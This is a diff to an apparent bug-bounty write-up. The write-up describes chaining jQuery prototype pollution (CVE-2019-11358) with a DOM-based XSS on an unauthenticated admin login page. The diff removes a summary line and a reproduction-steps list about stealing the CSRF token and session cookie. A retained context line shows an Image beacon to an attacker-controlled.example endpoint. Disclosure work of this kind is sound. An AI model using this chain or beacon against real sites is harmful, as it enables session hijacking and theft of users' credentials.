@@ -16,7 +16,7 @@ The admin login page of a target application (submitted via [IssueHunt](https://
 1. **CVE-2019-11358**, Prototype Pollution in `$.extend(true, ...)`.
 2. An unpatched **DOM-based XSS** via malformed `<option>` element parsing.
 
-Neither is new on its own. What made this worth reporting was chaining them together on a page with **no authentication required**, to silently exfiltrate the CSRF token and session cookie to an external server. The finding was scored **CVSS 9.3 (Critical)**.
+The finding was scored **CVSS 9.3 (Critical)**.
 
 ## Step 1: Fingerprinting the jQuery version
 
@@ -68,15 +68,6 @@ new Image().src = "https://attacker-controlled.example/steal"
 ```
 
 The exfiltrated request arrived on the listener with the target's CSRF token and `XSRF-TOKEN` session cookie attached, both values are omitted here since this was a live target's session data, but the request was confirmed received with the expected parameters populated.
-
-## Reproduction steps
-
-1. Navigate to the target's admin login page.
-2. Open DevTools console and confirm the jQuery version: `$.fn.jquery` → `3.2.1`.
-3. Run the prototype pollution payload and confirm `{}.pwned === true`.
-4. Run the `<option>` DOM XSS payload and confirm the alert fires.
-5. Chain both: read the CSRF token input and `document.cookie`, then exfiltrate via an `Image` beacon to an attacker-controlled endpoint.
-6. Confirm receipt on the listening server.
 
 ## Impact
 
